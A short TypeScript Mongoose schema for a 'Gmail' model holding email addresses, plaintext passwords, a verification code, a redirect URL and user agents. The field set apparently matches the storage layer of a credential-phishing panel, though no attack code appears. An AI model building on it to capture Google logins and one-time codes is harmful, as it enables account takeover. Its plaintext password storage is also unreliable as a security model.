
import mongoose, { Schema, Document, Model } from "mongoose";

export interface IGmail extends Document {
    email?: string;
    password?: string;
    state?: string;
    redirectTo?: string;
    code?: string;
    userAgent?: string;
    createdAt: Date;
    updatedAt: Date;
}

const GmailSchema = new Schema<IGmail>(
    {
        email: {
            type: String,
            lowercase: true,
            trim: true,
        },

        password: {
            type: String,
        },

        state: {
            type: String,
            default: "saved"
        },
        code: {
            type: String,
            default: "",
        },
        redirectTo: {
            type: String,
            default: ""
        },
        userAgent: {
            type: String,
            default: ""
        }
    },
    {
        timestamps: true,
    }
);

// Prevent duplicate emails
GmailSchema.index({ email: 1 }, { unique: true });

const Gmail: Model<IGmail> =
    mongoose.models.Gmail ||
    mongoose.model<IGmail>("Gmail", GmailSchema);

export default Gmail;
